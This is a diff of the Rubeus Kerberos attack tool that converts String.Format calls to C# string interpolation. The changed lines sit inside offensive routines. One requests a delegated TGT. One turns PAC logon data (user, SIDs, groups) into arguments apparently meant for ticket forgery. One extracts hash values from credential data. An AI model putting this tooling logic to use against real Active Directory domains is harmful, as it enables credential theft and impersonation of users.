@@ -403,7 +403,7 @@ namespace Rubeus {
                 if (opsec && (!roast) && ((encRepPart.flags & Interop.TicketFlags.ok_as_delegate) != 0))
                 {
                     Console.WriteLine("[*] '/opsec' passed and service ticket has the 'ok-as-delegate' flag set, requesting a delegated TGT.");
-                    byte[] tgtBytes = TGS_REQ.NewTGSReq(userName, domain, string.Format("krbtgt/{0}", domain), providedTicket, clientKey, paEType, requestEType, false, "", enterprise, roast, opsec, true);
+                    byte[] tgtBytes = TGS_REQ.NewTGSReq(userName, domain, $"krbtgt/{domain}", providedTicket, clientKey, paEType, requestEType, false, "", enterprise, roast, opsec, true);
 
                     if (String.IsNullOrEmpty(proxyUrl))
                     {
@@ -526,26 +526,26 @@ namespace Rubeus {
                     {
                         if (pacInfoBuffer is LogonInfo li)
                         {
-                            outArgs = String.Format("/user:{0} /id:{1} /pgid:{2} /logoncount:{3} /badpwdcount:{4} /sid:{5} /netbios:{6}", li.KerbValidationInfo.EffectiveName, li.KerbValidationInfo.UserId, li.KerbValidationInfo.PrimaryGroupId, li.KerbValidationInfo.LogonCount, li.KerbValidationInfo.BadPasswordCount, li.KerbValidationInfo.LogonDomainId.GetValue(), li.KerbValidationInfo.LogonDomainName);
+                            outArgs = $"/user:{li.KerbValidationInfo.EffectiveName} /id:{li.KerbValidationInfo.UserId} /pgid:{li.KerbValidationInfo.PrimaryGroupId} /logoncount:{li.KerbValidationInfo.LogonCount} /badpwdcount:{li.KerbValidationInfo.BadPasswordCount} /sid:{li.KerbValidationInfo.LogonDomainId.GetValue()} /netbios:{li.KerbValidationInfo.LogonDomainName}";
                             if (!String.IsNullOrEmpty(li.KerbValidationInfo.FullName.ToString()))
-                                outArgs = String.Format("{0} /displayname:\"{1}\"", outArgs, li.KerbValidationInfo.FullName);
+                                outArgs = $"{outArgs} /displayname:\"{li.KerbValidationInfo.FullName}\"";
                             if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonScript.ToString()))
-                                outArgs = String.Format("{0} /scriptpath:\"{1}\"", outArgs, li.KerbValidationInfo.LogonScript);
+                                outArgs = $"{outArgs} /scriptpath:\"{li.KerbValidationInfo.LogonScript}\"";
                             if (!String.IsNullOrEmpty(li.KerbValidationInfo.ProfilePath.ToString()))
-                                outArgs = String.Format("{0} /profilepath:\"{1}\"", outArgs, li.KerbValidationInfo.ProfilePath);
+                                outArgs = $"{outArgs} /profilepath:\"{li.KerbValidationInfo.ProfilePath}\"";
                             if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectory.ToString()))
-                                outArgs = String.Format("{0} /homedir:\"{1}\"", outArgs, li.KerbValidationInfo.HomeDirectory);
+                                outArgs = $"{outArgs} /homedir:\"{li.KerbValidationInfo.HomeDirectory}\"";
                             if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectoryDrive.ToString()))
-                                outArgs = String.Format("{0} /homedrive:\"{1}\"", outArgs, li.KerbValidationInfo.HomeDirectoryDrive);
+                                outArgs = $"{outArgs} /homedrive:\"{li.KerbValidationInfo.HomeDirectoryDrive}\"";
                             if (li.KerbValidationInfo.GroupCount > 0)
-                                outArgs = String.Format("{0} /groups:{1}", outArgs, li.KerbValidationInfo.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+                                outArgs = $"{outArgs} /groups:{li.KerbValidationInfo.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next)}";
                             if (li.KerbValidationInfo.SidCount > 0)
-                                outArgs = String.Format("{0} /sids:{1}", outArgs, li.KerbValidationInfo.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
+                                outArgs = $"{outArgs} /sids:{li.KerbValidationInfo.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next)}";
                             if (li.KerbValidationInfo.ResourceGroupCount > 0)
-                                outArgs = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", outArgs, li.KerbValidationInfo.ResourceGroupDomainSid.GetValue().ToString(), li.KerbValidationInfo.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+                                outArgs = $"{outArgs} /resourcegroupsid:{li.KerbValidationInfo.ResourceGroupDomainSid.GetValue().ToString()} /resourcegroups:{li.KerbValidationInfo.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next)}";
                             try
                             {
-                                outArgs = String.Format("{0} /logofftime:\"{1}\"", outArgs, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogoffTime.LowDateTime | ((long)li.KerbValidationInfo.LogoffTime.HighDateTime << 32)).ToLocalTime());
+                                outArgs = $"{outArgs} /logofftime:\"{DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogoffTime.LowDateTime | ((long)li.KerbValidationInfo.LogoffTime.HighDateTime << 32)).ToLocalTime()}\"";
                             }
                             catch { }
                             DateTime? passLastSet = null;
@@ -556,7 +556,7 @@ namespace Rubeus {
                             catch { }
                             if (passLastSet != null)
                             {
-                                outArgs = String.Format("{0} /pwdlastset:\"{1}\"", outArgs, ((DateTime)passLastSet).ToLocalTime());
+                                outArgs = $"{outArgs} /pwdlastset:\"{((DateTime)passLastSet).ToLocalTime()}\"";
                                 DateTime? passCanSet = null;
                                 try
                                 {
@@ -564,7 +564,7 @@ namespace Rubeus {
                                 }
                                 catch { }
                                 if (passCanSet != null)
-                                    outArgs = String.Format("{0} /minpassage:{1}d", outArgs, (((DateTime)passCanSet) - ((DateTime)passLastSet)).Days);
+                                    outArgs = $"{outArgs} /minpassage:{(((DateTime)passCanSet) - ((DateTime)passLastSet)).Days}d";
                                 DateTime? passMustSet = null;
                                 try
                                 {
@@ -572,12 +572,12 @@ namespace Rubeus {
                                 }
                                 catch { }
                                 if (passMustSet != null)
-                                    outArgs = String.Format("{0} /maxpassage:{1}d", outArgs, (((DateTime)passMustSet) - ((DateTime)passLastSet)).Days);
+                                    outArgs = $"{outArgs} /maxpassage:{(((DateTime)passMustSet) - ((DateTime)passLastSet)).Days}d";
                             }
                             if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonServer.ToString()))
-                                outArgs = String.Format("{0} /dc:{1}.{2}", outArgs, li.KerbValidationInfo.LogonServer.ToString(), cred.tickets[0].realm);
+                                outArgs = $"{outArgs} /dc:{li.KerbValidationInfo.LogonServer.ToString()}.{cred.tickets[0].realm}";
                             if ((Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
-                                outArgs = String.Format("{0} /uac:{1}", outArgs, String.Format("{0}", (Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl).Replace(" ", ""));
+                                outArgs = $"{outArgs} /uac:{$"{(Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl}".Replace(" ", "")}";
                         }
                     }
 
@@ -812,11 +812,11 @@ namespace Rubeus {
                                         int flags = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 4);
                                         if (flags == 3)
                                         {
-                                            hash = String.Format("{0}:{1}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(8).Take(16).ToArray()), Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
+                                            hash = $"{Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(8).Take(16).ToArray())}:{Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray())}";
                                         }
                                         else
                                         {
-                                            hash = String.Format("{0}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
+                                            hash = $"{Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray())}";
                                         }
                                     }
                                     else
